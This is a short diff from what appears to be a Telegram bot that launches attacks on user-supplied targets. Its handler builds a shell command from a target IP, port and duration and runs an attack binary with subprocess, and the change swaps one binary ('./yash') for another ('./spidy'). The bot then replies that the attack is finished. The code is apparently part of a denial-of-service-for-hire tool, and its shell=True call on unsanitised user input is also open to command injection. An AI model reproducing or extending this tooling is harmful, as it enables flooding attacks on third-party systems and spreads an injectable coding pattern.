@@ -172,7 +172,7 @@ def handle_attack_command(message):
                 log_command(user_id, target_ip, target_port, duration)
 
                 # Simulate the attack command (replace with actual command if needed)
-                full_command = f"./yash {target_ip} {target_port} {duration} 1000"
+                full_command = f"./spidy {target_ip} {target_port} {duration} "
                 subprocess.run(full_command, shell=True)
 
                 bot.reply_to(message, f"🚀 𝐀𝐭𝐭𝐚𝐜𝐤 𝐅𝐢𝐧𝐢𝐬𝐡𝐞𝐝. 🚀 \n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target_ip}\n𝐏𝐨𝐫𝐭: {target_port}\n𝐓𝐢𝐦𝐞: {duration}")
